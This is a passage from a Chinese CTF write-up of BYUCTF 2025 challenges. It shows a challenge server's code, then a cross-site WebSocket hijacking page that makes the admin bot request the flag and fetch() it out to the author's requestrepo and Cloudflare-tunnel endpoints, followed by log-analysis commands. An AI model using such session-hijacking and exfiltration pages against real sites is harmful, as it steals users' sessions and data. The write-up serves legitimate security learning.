class="string">&#x27;response&#x27;</span>, <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (response.<span class="title function_">url</span>() === url) &#123;</span><br><span class="line">          statusCode = response.<span class="title function_">status</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// console.log(&#x27;Navigating to the URL&#x27;);</span></span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">timeout</span>: <span class="number">10000</span>, <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle2&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!statusCode &amp;&amp; response) &#123;</span><br><span class="line">        statusCode = response.<span class="title function_">status</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// console.log(&#x27;Waiting for page content&#x27;);</span></span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&#x27;body&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (statusCode === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (statusCode) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`Unexpected status code <span class="subst">$&#123;statusCode&#125;</span>`</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No status code captured&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error navigating to page:&#x27;</span>, error.<span class="property">message</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`Navigation failed - <span class="subst">$&#123;error.message&#125;</span>`</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="comment">// console.log(&#x27;Closing page&#x27;);</span></span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error launching browser:&#x27;</span>, error.<span class="property">message</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Browser launch failed - <span class="subst">$&#123;error.message&#125;</span>`</span>;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (browser) &#123;</span><br><span class="line">      <span class="comment">// console.log(&#x27;Closing browser&#x27;);</span></span><br><span class="line">      <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; visitUrl &#125;;</span><br></pre></td></tr></table></figure>

<p>其中会对我们的url直接进行访问，并且还会带有Cookie，而且我直接尝试输入<code>https://4fz7yove.requestrepo.com/</code>发现确实能够收到请求</p>
<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250517-205911.jpg" alt="1"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">WebSocket</span> = <span class="built_in">require</span>(<span class="string">&#x27;ws&#x27;</span>); <span class="comment">// WebSocket library</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; visitUrl &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./adminBot&#x27;</span>); <span class="comment">// Import the visitUrl function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Secret key for signing JWT</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">JWT_SECRET</span> = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middleware to parse cookies</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create HTTP server</span></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(app);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a WebSocket server</span></span><br><span class="line"><span class="keyword">const</span> wss = <span class="keyword">new</span> <span class="title class_">WebSocket</span>.<span class="title class_">Server</span>(&#123; server &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middleware to check for a valid JWT cookie</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkCookie</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the user does not have a token, generate a new one</span></span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = <span class="title function_">uuidv4</span>();</span><br><span class="line">    <span class="keyword">const</span> jwtToken = jwt.<span class="title function_">sign</span>(&#123; userId &#125;, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, jwtToken, &#123;</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">sameSite</span>: <span class="string">&#x27;None&#x27;</span>,</span><br><span class="line">      <span class="attr">secure</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// Verify the JWT token and get the userId</span></span><br><span class="line">    <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">    req.<span class="property">userId</span> = decoded.<span class="property">userId</span>;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="comment">// If the JWT token is invalid, generate a new one</span></span><br><span class="line">    <span class="keyword">const</span> userId = <span class="title function_">uuidv4</span>();</span><br><span class="line">    <span class="keyword">const</span> jwtToken = jwt.<span class="title function_">sign</span>(&#123; userId &#125;, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, jwtToken, &#123;</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">sameSite</span>: <span class="string">&#x27;None&#x27;</span>,</span><br><span class="line">      <span class="attr">secure</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send a message to the WebSocket</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sendMsg</span> = (<span class="params">ws, msg</span>) =&gt; &#123;</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">message</span>: msg, <span class="attr">sender</span>: <span class="string">&#x27;URL Bot&#x27;</span> &#125;));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Serve the static files after checking the cookie</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, checkCookie, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// WebSocket connection handler</span></span><br><span class="line">wss.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">ws, req</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Get the userId from the cookie</span></span><br><span class="line">  <span class="keyword">const</span> userId = req.<span class="property">headers</span>.<span class="property">cookie</span> ? req.<span class="property">headers</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;token=&#x27;</span>)[<span class="number">1</span>] : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (userId) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(userId, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">      <span class="keyword">const</span> user = decoded.<span class="property">userId</span>;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">sendMsg</span>(ws, <span class="string">`Welcome! Send a URL and the admin will visit it to check if it&#x27;s up`</span>);</span><br><span class="line"></span><br><span class="line">      ws.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="title function_">async</span> (data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> message = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (message.<span class="property">message</span> === <span class="string">&#x27;/getFlag&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (user === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">              <span class="title function_">sendMsg</span>(ws, <span class="string">`Flag: <span class="subst">$&#123;FLAG&#125;</span>`</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="title function_">sendMsg</span>(ws, <span class="string">&#x27;You are not authorized to get the flag&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (message.<span class="property">message</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;http://&#x27;</span>) || message.<span class="property">message</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>)) &#123;</span><br><span class="line">              <span class="title function_">sendMsg</span>(ws, <span class="string">&#x27;Checking URL...&#x27;</span>);</span><br><span class="line">              <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">visitUrl</span>(message.<span class="property">message</span>); <span class="comment">// have the adminBot visit the URL</span></span><br><span class="line">              <span class="keyword">if</span> (result === <span class="string">&#x27;success&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_">sendMsg</span>(ws, <span class="string">`<span class="subst">$&#123;message.message&#125;</span> is up!`</span>);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">sendMsg</span>(ws, <span class="string">`<span class="subst">$&#123;message.message&#125;</span> returned an error: <span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="title function_">sendMsg</span>(ws, <span class="string">&#x27;Please send a URL starting with http:// or https://&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          <span class="comment">// Invalid message</span></span><br><span class="line">          ws.<span class="title function_">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="comment">// Invalid JWT</span></span><br><span class="line">      ws.<span class="title function_">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// No userId found in the cookie</span></span><br><span class="line">    ws.<span class="title function_">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start the HTTP server</span></span><br><span class="line">server.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>验证身份发送flag，直接劫持会话</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Malicious Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://wembsoncket.chal.cyberjousting.com&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;WebSocket connection established&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">sender</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">message</span>: <span class="string">&#x27;/getFlag&#x27;</span> &#125;));</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received message:&quot;</span>, event.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://4fz7yove.requestrepo.com/?flag=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(data.<span class="property">message</span>));</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>收到了，但是并不是正确的Cookie，说明思路是对的，就是劫持websocket的会话，让他去访问得到flag，再带出来，后面疑问，发现怎么打都打不出来，结果一问<img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250518-103216.jpg" alt="1"></p>
<p>昨天测试，我发现我的HK服务器，以及很多东西都会被waf，只能收到DNSLOG，不能收到http请求，所以为了解决这个问题，我打算利用CF来起一个隧道</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加 Cloudflare GPG 密钥</span></span><br><span class="line">curl -L https://pkg.cloudflare.com/cloudflare-main.gpg | <span class="built_in">sudo</span> <span class="built_in">tee</span> /usr/share/keyrings/cloudflare-main.gpg &gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加 Cloudflare 软件源</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared <span class="subst">$(lsb_release -cs)</span> main&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/cloudflared.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新软件包并安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install cloudflared</span><br><span class="line">cloudflared --version</span><br></pre></td></tr></table></figure>

<p>需要登录一下<code>cloudflared login</code>，由于我只有两个域名，博客的域名开了CF会更卡，所以用的<code>rb3.top</code>，再开启通道即可<code>cloudflared tunnel --url http://localhost:80</code></p>
<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250518-111552.jpg" alt="1"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Malicious Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://wembsoncket.chal.cyberjousting.com&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;WebSocket connection established&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      ws.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">sender</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">message</span>: <span class="string">&#x27;/getFlag&#x27;</span> &#125;));</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received message:&quot;</span>, event.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://excuse-postcard-analyses-button.trycloudflare.com/?flag=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(data.<span class="property">message</span>));</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在改成9999端口准备收Cookie，<code>cloudflared tunnel --url http://localhost:9999</code>，注意这个html要放在github pages上面，不然也不能成功</p>
<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250518-114842.jpg" alt="1"></p>
<p>不过这样产生的域名很长，我们可以使用自己的域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cloudflared tunnel create attack-tunnel</span><br><span class="line"></span><br><span class="line">cloudflared tunnel route dns c5c55717-14ae-4b8c-95f7-bf770c9bee16 9999.rb3.top</span><br><span class="line"></span><br><span class="line">mkdir -p /root/.cloudflared/</span><br><span class="line">nano /root/.cloudflared/config.yml</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tunnel:</span> <span class="string">c5c55717-14ae-4b8c-95f7-bf770c9bee16</span></span><br><span class="line"><span class="attr">credentials-file:</span> <span class="string">~/.cloudflared/c5c55717-14ae-4b8c-95f7-bf770c9bee16.json</span></span><br><span class="line"><span class="attr">ingress:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostname:</span> <span class="number">9999.</span><span class="string">rb3.top</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">http://localhost:9999</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">service:</span> <span class="string">http_status:404</span></span><br></pre></td></tr></table></figure>

<p>就配置好了，运行这两个都可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cloudflared tunnel run attack-tunnel</span><br><span class="line">cloudflared tunnel run c5c55717-14ae-4b8c-95f7-bf770c9bee16</span><br></pre></td></tr></table></figure>

<h2 id="Are-You-Looking-Me-Up"><a href="#Are-You-Looking-Me-Up" class="headerlink" title="Are You Looking Me Up?"></a>Are You Looking Me Up?</h2><p>DNS请求日志，首先我们要知道哪些是DNS请求，通常DNS请求使用的是UDP协议，端口是53。直接让AI写个命令提取出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E &quot;,53,&quot; logs.txt | awk -F, &#x27;&#123;for(i=1;i&lt;=NF;i++) if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ &amp;&amp; $(i+2)==&quot;53&quot;) print $i&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250517-190040.jpg" alt="1"></p>
<p>交这个最多的就是对了</p>
<h2 id="Mine-Over-Matter"><a href="#Mine-Over-Matter" class="headerlink" title="Mine Over Matter"></a>Mine Over Matter</h2><blockquote>
<p>Your SOC has flagged unusual outbound traffic on a segment of your network. After capturing logs from the router during the anomaly, they handed it over to you—the network analyst.</p>
<p>Somewhere in this mess, two compromised hosts are secretly mining cryptocurrency and draining resources. Analyze the traffic, identify the two rogue IP addresses running miners, and report them to the Incident Response team before your network becomes a crypto farm.</p>
</blockquote>
<p>找挖矿的，一般都是那种挖矿池里面的端口，写个查找外链接数量的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">grep -E &#x27;,(3333|4444|5555|7777|8888|9999|14433|14444|45560|45700|16060),&#x27; logfile.txt | awk -F, &#x27;&#123;</span><br><span class="line">&gt;   for(i=1; i&lt;=NF; i++) </span><br><span class="line">&gt;     if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) &#123;</span><br><span class="line">&gt;       srcip=$i; </span><br><span class="line">&gt;       break;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;   print srcip</span><br><span class="line">&gt; &#125;&#x27; | sort | uniq -c | sort -nr | head -10</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/5/BYUCTF2025/QQ20250517-191844.jpg" alt="1"></p>
